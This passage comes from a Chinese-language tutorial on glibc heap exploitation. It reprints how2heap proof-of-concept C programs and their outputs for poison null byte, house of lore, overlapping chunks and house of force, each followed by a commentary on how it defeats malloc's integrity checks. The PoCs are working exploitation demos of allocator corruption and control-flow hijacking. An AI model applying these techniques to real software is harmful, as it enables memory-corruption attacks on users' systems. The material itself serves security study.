\u0026#39;real\u0026#39; size of \u0026#39;a\u0026#39; (it may be more than 0x100 because of rounding): 0x108 b: 0x19e6120 c: 0x19e6330 We allocate a barrier at 0x19e6440, so that c is not consolidated with the top-chunk when freed. The barrier is not strictly necessary, but makes things less confusing In newer versions of glibc we will need to have our updated size inside b itself to pass the check \u0026#39;chunksize(P) != prev_size (next_chunk(P))\u0026#39; b.size: 0x211 b.size is: (0x200 + 0x10) | prev_in_use We overflow \u0026#39;a\u0026#39; with a single null byte into the metadata of \u0026#39;b\u0026#39; b.size: 0x200 c.prev_size is 0x210 We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P)) b1: 0x19e6120 Now we malloc \u0026#39;b1\u0026#39;. It will be placed where \u0026#39;b\u0026#39; was. At this point c.prev_size should have been updated, but it was not: 0x210 Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0 We malloc \u0026#39;b2\u0026#39;, our \u0026#39;victim\u0026#39; chunk. b2: 0x19e6230 Current b2 content: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB Now we free \u0026#39;b1\u0026#39; and \u0026#39;c\u0026#39;: this will consolidate the chunks \u0026#39;b1\u0026#39; and \u0026#39;c\u0026#39; (forgetting about\u0026#39;b2\u0026#39;). Finally, we allocate \u0026#39;d\u0026#39;, overlapping \u0026#39;b2\u0026#39;. d: 0x19e6120 Now \u0026#39;d\u0026#39; and \u0026#39;b2\u0026#39; overlap. New b2 content: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunksfor the clear explanation of this technique. 这里的漏洞很简单，就是 off-by-null，通过 a 溢出了一字节到已经被释放了的 b，使得 b 的 chunk_size 被改变。这里需要注意的是，新版本 glibc 增加了检验机制，如果 chunksize(P) != prev_size (next_chunk(P)) 则会报错，那么如何绕过呢？\n我们知道 P 是指 chunk 指针，也就是 b-0x10，那么 b-0x8 就是这里的 chunksize(P)，被 off-by-null 后变成 0x200。而 next_chunk(P) 则为 b-0x10+0x200 = b+0x1f0。所以 prev_size(next_chunk(P)) 实际上就是 *(b+0x1f0)。那么我们提前修改 b+0x1f0 = 0x200 既绕过了验证。\n随后申请了 0x100 的 b1，位于原来 b 的位置上，这时原本应该更新的是 c 的 prev_size，但是由于我们刚才说的 prev_size(next_chunk(P)) 等于 *(b+0x1f0)，实际上被更新的位置是 b+0x1f0，也就是 c.prev_size - 0x10。换句话说，c 依然认为它前面的块的大小是 0x210。\n于是我们在 b1 下面申请 0x80 的 b2，尽管它被夹在 b1 和 c 中间，当我们释放 b1 和 c 时两者依旧会合并，但我们依然控制着 b2 指针！这个时候申请 0x300 的 d，它还是会被放到 b1 的位置，那么通过 d 就可以完全控制 b2 这个 chunk。\nhouse_of_lore # 源码：\n/* Advanced exploitation of the House of Lore - Malloc Maleficarum. This PoC take care also of the glibc hardening of smallbin corruption. [...] else { bck = victim-\u0026gt;bk; if (__glibc_unlikely (bck-\u0026gt;fd != victim)){ errstr = \u0026#34;malloc(): smallbin double linked list corrupted\u0026#34;; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-\u0026gt;bk = bck; bck-\u0026gt;fd = bin; [...] */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; void jackpot(){ puts(\u0026#34;Nice jump d00d\u0026#34;); exit(0); } int main(int argc, char * argv[]){ intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; fprintf(stderr,\u0026#34;\\nWelcome to the House of Lore\\n\u0026#34;); fprintf(stderr,\u0026#34;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\u0026#34;); fprintf(stderr,\u0026#34;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\\n\\n\u0026#34;); fprintf(stderr,\u0026#34;Allocating the victim chunk\\n\u0026#34;); intptr_t *victim = malloc(100); fprintf(stderr,\u0026#34;Allocated the first small chunk on the heap at %p\\n\u0026#34;, victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr,\u0026#34;stack_buffer_1 at %p\\n\u0026#34;, (void*)stack_buffer_1); fprintf(stderr,\u0026#34;stack_buffer_2 at %p\\n\u0026#34;, (void*)stack_buffer_2); fprintf(stderr,\u0026#34;Create a fake chunk on the stack\\n\u0026#34;); fprintf(stderr,\u0026#34;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\u0026#34; \u0026#34;in second to the last malloc, which putting stack address on smallbin list\\n\u0026#34;); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr,\u0026#34;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \u0026#34; \u0026#34;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake\u0026#34; \u0026#34;chunk on stack\u0026#34;); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr,\u0026#34;Allocating another large chunk in order to avoid consolidating the top chunk with\u0026#34; \u0026#34;the small one during the free()\\n\u0026#34;); void *p5 = malloc(1000); fprintf(stderr,\u0026#34;Allocated the large chunk on the heap at %p\\n\u0026#34;, p5); fprintf(stderr,\u0026#34;Freeing the chunk %p, it will be inserted in the unsorted bin\\n\u0026#34;, victim); free((void*)victim); fprintf(stderr,\u0026#34;\\nIn the unsorted bin the victim\u0026#39;s fwd and bk pointers are nil\\n\u0026#34;); fprintf(stderr,\u0026#34;victim-\u0026gt;fwd: %p\\n\u0026#34;, (void *)victim[0]); fprintf(stderr,\u0026#34;victim-\u0026gt;bk: %p\\n\\n\u0026#34;, (void *)victim[1]); fprintf(stderr,\u0026#34;Now performing a malloc that can\u0026#39;t be handled by the UnsortedBin, nor the small bin\\n\u0026#34;); fprintf(stderr,\u0026#34;This means that the chunk %p will be inserted in front of the SmallBin\\n\u0026#34;, victim); void *p2 = malloc(1200); fprintf(stderr,\u0026#34;The chunk that can\u0026#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\u0026#34;, p2); fprintf(stderr,\u0026#34;The victim chunk has been sorted and its fwd and bk pointers updated\\n\u0026#34;); fprintf(stderr,\u0026#34;victim-\u0026gt;fwd: %p\\n\u0026#34;, (void *)victim[0]); fprintf(stderr,\u0026#34;victim-\u0026gt;bk: %p\\n\\n\u0026#34;, (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr,\u0026#34;Now emulating a vulnerability that can overwrite the victim-\u0026gt;bk pointer\\n\u0026#34;); victim[1] = (intptr_t)stack_buffer_1; // victim-\u0026gt;bk is pointing to stack //------------------------------------ fprintf(stderr,\u0026#34;Now allocating a chunk with size equal to the first one freed\\n\u0026#34;); fprintf(stderr,\u0026#34;This should return the overwritten victim chunk and set the bin-\u0026gt;bk to the injected victim-\u0026gt;bk pointer\\n\u0026#34;); void *p3 = malloc(100); fprintf(stderr,\u0026#34;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-\u0026gt;bk\\n\u0026#34;); char *p4 = malloc(100); fprintf(stderr,\u0026#34;p4 = malloc(100)\\n\u0026#34;); fprintf(stderr,\u0026#34;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\u0026#34;, stack_buffer_2[2]); fprintf(stderr,\u0026#34;\\np4 is %p and should be on the stack!\\n\u0026#34;, p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode memcpy((p4+40), \u0026amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary } 输出：\nWelcome to the House of Lore This is a revisited version that bypass also the hardening check introduced by glibc malloc This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23 Allocating the victim chunk Allocated the first small chunk on the heap at 0x2006010 stack_buffer_1 at 0x7ffd3c0b7460 stack_buffer_2 at 0x7ffd3c0b7440 Create a fake chunk on the stack Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free() Allocated the large chunk on the heap at 0x2006080 Freeing the chunk 0x2006010, it will be inserted in the unsorted bin In the unsorted bin the victim\u0026#39;s fwd and bk pointers are nil victim-\u0026gt;fwd: (nil) victim-\u0026gt;bk: (nil) Now performing a malloc that can\u0026#39;t be handled by the UnsortedBin, nor the small bin This means that the chunk 0x2006010 will be inserted in front of the SmallBin The chunk that can\u0026#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x2006470 The victim chunk has been sorted and its fwd and bk pointers updated victim-\u0026gt;fwd: 0x7fddc3aecbd8 victim-\u0026gt;bk: 0x7fddc3aecbd8 Now emulating a vulnerability that can overwrite the victim-\u0026gt;bk pointer Now allocating a chunk with size equal to the first one freed This should return the overwritten victim chunk and set the bin-\u0026gt;bk to the injected victim-\u0026gt;bk pointer This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-\u0026gt;bk p4 = malloc(100) The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fddc3aecbd8 p4 is 0x7ffd3c0b7470 and should be on the stack! Nice jump d00d 逻辑还是比较简单的，就是通过修改栈变量以及堆上 small chunk victim 的 bk 指针构造出一条完整的双向链表，以通过 small bin 检查从而使得 malloc 返回一个栈上地址。注意中间关键的一步是申请了一个不能被 unsorted bin 和 small bin 满足的 chunk，因此只能从 top chunk 切割，这时原本在 unsorted bin 中的 victim 就进入了 small bin。\noverlapping_chunks # 源码：\n/* A simple tale of overlapping chunk. This technique is taken from http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; int main(int argc , char* argv[]){ intptr_t *p1,*p2,*p3,*p4; fprintf(stderr,\u0026#34;\\nThis is a simple chunks overlapping problem\\n\\n\u0026#34;); fprintf(stderr,\u0026#34;Let\u0026#39;s start to allocate 3 chunks on the heap\\n\u0026#34;); p1 = malloc(0x100 - 8); p2 = malloc(0x100 - 8); p3 = malloc(0x80 - 8); fprintf(stderr,\u0026#34;The 3 chunks have been allocated here:\\np1=%p\\np2=%p\\np3=%p\\n\u0026#34;, p1, p2, p3); memset(p1,\u0026#39;1\u0026#39;, 0x100 - 8); memset(p2,\u0026#39;2\u0026#39;, 0x100 - 8); memset(p3,\u0026#39;3\u0026#39;, 0x80 - 8); fprintf(stderr,\u0026#34;\\nNow let\u0026#39;s free the chunk p2\\n\u0026#34;); free(p2); fprintf(stderr,\u0026#34;The chunk p2 is now in the unsorted bin ready to serve possible\\nnew malloc() of its size\\n\u0026#34;); fprintf(stderr,\u0026#34;Now let\u0026#39;s simulate an overflow that can overwrite the size of the\\nchunk freed p2.\\n\u0026#34;); fprintf(stderr,\u0026#34;For a toy program, the value of the last 3 bits is unimportant;\u0026#34; \u0026#34;however, it is best to maintain the stability of the heap.\\n\u0026#34;); fprintf(stderr,\u0026#34;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),\u0026#34; \u0026#34;to assure that p1 is not mistaken for a free chunk.\\n\u0026#34;); int evil_chunk_size = 0x181; int evil_region_size = 0x180 - 8; fprintf(stderr,\u0026#34;We are going to set the size of chunk p2 to to %d, which gives us\\na region size of %d\\n\u0026#34;, evil_chunk_size, evil_region_size); *(p2-1) = evil_chunk_size; // we are overwriting the \u0026#34;size\u0026#34; field of chunk p2 fprintf(stderr,\u0026#34;\\nNow let\u0026#39;s allocate another chunk with a size equal to the data\\n\u0026#34; \u0026#34;size of the chunk p2 injected size\\n\u0026#34;); fprintf(stderr,\u0026#34;This malloc will be served from the previously freed chunk that\\n\u0026#34; \u0026#34;is parked in the unsorted bin which size has been modified by us\\n\u0026#34;); p4 = malloc(evil_region_size); fprintf(stderr,\u0026#34;\\np4 has been allocated at %p and ends at %p\\n\u0026#34;, (char *)p4, (char *)p4+evil_region_size); fprintf(stderr,\u0026#34;p3 starts at %p and ends at %p\\n\u0026#34;, (char *)p3, (char *)p3+0x80-8); fprintf(stderr,\u0026#34;p4 should overlap with p3, in this case p4 includes all p3.\\n\u0026#34;); fprintf(stderr,\u0026#34;\\nNow everything copied inside chunk p4 can overwrites data on\\nchunk p3,\u0026#34; \u0026#34;and data written to chunk p3 can overwrite data\\nstored in the p4 chunk.\\n\\n\u0026#34;); fprintf(stderr,\u0026#34;Let\u0026#39;s run through an example. Right now, we have:\\n\u0026#34;); fprintf(stderr,\u0026#34;p4 = %s\\n\u0026#34;, (char *)p4); fprintf(stderr,\u0026#34;p3 = %s\\n\u0026#34;, (char *)p3); fprintf(stderr,\u0026#34;\\nIf we memset(p4,\u0026#39;4\u0026#39;, %d), we have:\\n\u0026#34;, evil_region_size); memset(p4,\u0026#39;4\u0026#39;, evil_region_size); fprintf(stderr,\u0026#34;p4 = %s\\n\u0026#34;, (char *)p4); fprintf(stderr,\u0026#34;p3 = %s\\n\u0026#34;, (char *)p3); fprintf(stderr,\u0026#34;\\nAnd if we then memset(p3,\u0026#39;3\u0026#39;, 80), we have:\\n\u0026#34;); memset(p3,\u0026#39;3\u0026#39;, 80); fprintf(stderr,\u0026#34;p4 = %s\\n\u0026#34;, (char *)p4); fprintf(stderr,\u0026#34;p3 = %s\\n\u0026#34;, (char *)p3); } 输出：\nThis is a simple chunks overlapping problem Let\u0026#39;s start to allocate 3 chunks on the heap The 3 chunks have been allocated here: p1=0x1b9a010 p2=0x1b9a110 p3=0x1b9a210 Now let\u0026#39;s free the chunk p2 The chunk p2 is now in the unsorted bin ready to serve possible new malloc() of its size Now let\u0026#39;s simulate an overflow that can overwrite the size of the chunk freed p2. For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap. To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk. We are going to set the size of chunk p2 to to 385, which gives us a region size of 376 Now let\u0026#39;s allocate another chunk with a size equal to the data size of the chunk p2 injected size This malloc will be served from the previously freed chunk that is parked in the unsorted bin which size has been modified by us p4 has been allocated at 0x1b9a110 and ends at 0x1b9a288 p3 starts at 0x1b9a210 and ends at 0x1b9a288 p4 should overlap with p3, in this case p4 includes all p3. Now everything copied inside chunk p4 can overwrites data on chunk p3, and data written to chunk p3 can overwrite data stored in the p4 chunk. Let\u0026#39;s run through an example. Right now, we have: p4 = xK�8� p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333\u0002� If we memset(p4,\u0026#39;4\u0026#39;, 376), we have: p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444\u000244444444� p3 = 44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444\u0002� And if we then memset(p3,\u0026#39;3\u0026#39;, 80), we have: p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444\u000244444444� p3 = 33333333333333333333333333333333333333333333333333333333333333333333333333333333444444444444444444444444444444444444444\u0002� 源程序和输出结果里已经相当清晰了，这里就是修改了一个 unsorted bin 中的 free chunk 的 chunk_size，然后把它申请回来，这样它的一部分就和原本紧挨在下面的 chunk 重叠了，那么向它的这部分写入数据就会影响到下面的这个 chunk，反之亦然。\noverlapping_chunks_2 # 源码：\n/* Yet another simple tale of overlapping chunk. This technique is taken from https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf. This is also referenced as Nonadjacent Free Chunk Consolidation Attack. */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; int main(){ intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6; int prev_in_use = 0x1; fprintf(stderr,\u0026#34;\\nThis is a simple chunks overlapping problem\u0026#34;); fprintf(stderr,\u0026#34;\\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\\n\u0026#34;); fprintf(stderr,\u0026#34;\\nLet\u0026#39;s start to allocate 5 chunks on the heap:\u0026#34;); p1 = malloc(1000); p2 = malloc(1000); p3 = malloc(1000); p4 = malloc(1000); p5 = malloc(1000); real_size_p1 = malloc_usable_size(p1); real_size_p2 = malloc_usable_size(p2); real_size_p3 = malloc_usable_size(p3); real_size_p4 = malloc_usable_size(p4); real_size_p5 = malloc_usable_size(p5); fprintf(stderr,\u0026#34;\\n\\nchunk p1 from %p to %p\u0026#34;, p1, (unsigned char *)p1+malloc_usable_size(p1)); fprintf(stderr,\u0026#34;\\nchunk p2 from %p to %p\u0026#34;, p2, (unsigned char *)p2+malloc_usable_size(p2)); fprintf(stderr,\u0026#34;\\nchunk p3 from %p to %p\u0026#34;, p3, (unsigned char *)p3+malloc_usable_size(p3)); fprintf(stderr,\u0026#34;\\nchunk p4 from %p to %p\u0026#34;, p4, (unsigned char *)p4+malloc_usable_size(p4)); fprintf(stderr,\u0026#34;\\nchunk p5 from %p to %p\\n\u0026#34;, p5, (unsigned char *)p5+malloc_usable_size(p5)); memset(p1,\u0026#39;A\u0026#39;,real_size_p1); memset(p2,\u0026#39;B\u0026#39;,real_size_p2); memset(p3,\u0026#39;C\u0026#39;,real_size_p3); memset(p4,\u0026#39;D\u0026#39;,real_size_p4); memset(p5,\u0026#39;E\u0026#39;,real_size_p5); fprintf(stderr,\u0026#34;\\nLet\u0026#39;s free the chunk p4.\\nIn this case this isn\u0026#39;t coealesced with top chunk since we have p5 bordering top chunk after p4\\n\u0026#34;); free(p4); fprintf(stderr,\u0026#34;\\nLet\u0026#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\\nwith the size of chunk_p2 + size of chunk_p3\\n\u0026#34;); *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //\u0026lt;--- BUG HERE fprintf(stderr,\u0026#34;\\nNow during the free() operation on p2, the allocator is fooled to think that \\nthe nextchunk is p4 (since p2 + size_p2 now point to p4) \\n\u0026#34;); fprintf(stderr,\u0026#34;\\nThis operation will basically create a big free chunk that wrongly includes p3\\n\u0026#34;); free(p2); fprintf(stderr,\u0026#34;\\nNow let\u0026#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk\\n\u0026#34;); p6 = malloc(2000); real_size_p6 = malloc_usable_size(p6); fprintf(stderr,\u0026#34;\\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \\nwe can overwrite data in p3 by writing on chunk p6\\n\u0026#34;); fprintf(stderr,\u0026#34;\\nchunk p6 from %p to %p\u0026#34;, p6, (unsigned char *)p6+real_size_p6); fprintf(stderr,\u0026#34;\\nchunk p3 from %p to %p\\n\u0026#34;, p3, (unsigned char *) p3+real_size_p3); fprintf(stderr,\u0026#34;\\nData inside chunk p3: \\n\\n\u0026#34;); fprintf(stderr,\u0026#34;%s\\n\u0026#34;,(char *)p3); fprintf(stderr,\u0026#34;\\nLet\u0026#39;s write something inside p6\\n\u0026#34;); memset(p6,\u0026#39;F\u0026#39;,1500); fprintf(stderr,\u0026#34;\\nData inside chunk p3: \\n\\n\u0026#34;); fprintf(stderr,\u0026#34;%s\\n\u0026#34;,(char *)p3); } 输出：\nThis is a simple chunks overlapping problem This is also referenced as Nonadjacent Free Chunk Consolidation Attack Let\u0026#39;s start to allocate 5 chunks on the heap: chunk p1 from 0x17c9010 to 0x17c93f8 chunk p2 from 0x17c9400 to 0x17c97e8 chunk p3 from 0x17c97f0 to 0x17c9bd8 chunk p4 from 0x17c9be0 to 0x17c9fc8 chunk p5 from 0x17c9fd0 to 0x17ca3b8 Let\u0026#39;s free the chunk p4. In this case this isn\u0026#39;t coealesced with top chunk since we have p5 bordering top chunk after p4 Let\u0026#39;s trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2 with the size of chunk_p2 + size of chunk_p3 Now during the free() operation on p2, the allocator is fooled to think that the nextchunk is p4 (since p2 + size_p2 now point to p4) This operation will basically create a big free chunk that wrongly includes p3 Now let\u0026#39;s allocate a new chunk with a size that can be satisfied by the previously freed chunk Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and we can overwrite data in p3 by writing on chunk p6 chunk p6 from 0x17c9400 to 0x17c9bd8 chunk p3 from 0x17c97f0 to 0x17c9bd8 Data inside chunk p3: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�\u0003 Let\u0026#39;s write something inside p6 Data inside chunk p3: FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�\u0003 和上一个的区别在于，这次修改的是 allocated chunk 的 chunk_size。首先申请五个大小超过 fastbin 范围的 chunk，然后 free(p4)。随后通过 p1 的堆溢出修改 p2 的 chunk_size 为 p2 与 p3 的 chunk_size 之和。这就导致在 free(p2) 时，分配器认为需要释放 chunk_size2+chunk_size3 这么大一块内存，而下一块 chunk 恰好是同样空闲的 p4，这样就会将原本不相邻的 p2 和 p4 合并释放，中间的 p3 则成了最大受害者。\n这时再申请一块 chunk_size2+chunk_size3 的 chunkp6，它就和 p3 重叠了，控制了整块 p3 的数据。\nhouse_of_force # 源码：\n/* This PoC works also with ASLR enabled. It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled. If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum (http://phrack.org/issues/66/10.html) Tested in Ubuntu 14.04, 64bit. */ #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;malloc.h\u0026gt; char bss_var[] =\u0026#34;This is a string that we want to overwrite.\u0026#34;; int main(int argc , char* argv[]) { fprintf(stderr,\u0026#34;\\nWelcome to the House of Force\\n\\n\u0026#34;); fprintf(stderr,\u0026#34;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n\u0026#34;); fprintf(stderr,\u0026#34;The top chunk is a special chunk. Is the last in memory \u0026#34; \u0026#34;and is the chunk that will be resized when malloc asks for more space from the os.\\n\u0026#34;); fprintf(stderr,\u0026#34;\\nIn the end, we will use this to overwrite a variable at %p.\\n\u0026#34;, bss_var); fprintf(stderr,\u0026#34;Its current value is: %s\\n\u0026#34;, bss_var); fprintf(stderr,\u0026#34;\\nLet\u0026#39;s allocate the first chunk, taking space from the wilderness.\\n\u0026#34;); intptr_t *p1 = malloc(256); fprintf(stderr,\u0026#34;The chunk of 256 bytes has been allocated at %p.\\n\u0026#34;, p1 - 2); fprintf(stderr,\u0026#34;\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n\u0026#34;); int real_size = malloc_usable_size(p1); fprintf(stderr,\u0026#34;Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n\u0026#34;, real_size + sizeof(long)*2); fprintf(stderr,\u0026#34;\\nNow let\u0026#39;s emulate a vulnerability that can overwrite the header of the Top Chunk\\n\u0026#34;); //----- VULNERABILITY ---- intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long)); fprintf(stderr,\u0026#34;\\nThe top chunk starts at %p\\n\u0026#34;, ptr_top); fprintf(stderr,\u0026#34;\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n\u0026#34;); fprintf(stderr,\u0026#34;Old size of top chunk %#llx\\n\u0026#34;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); *(intptr_t *)((char *)ptr_top + sizeof(long)) = -1; fprintf(stderr,\u0026#34;New size of top chunk %#llx\\n\u0026#34;, *((unsigned long long int *)((char *)ptr_top + sizeof(long)))); //------------------------ fprintf(stderr,\u0026#34;\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n\u0026#34; \u0026#34;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n\u0026#34; \u0026#34;overflow) and will then be able 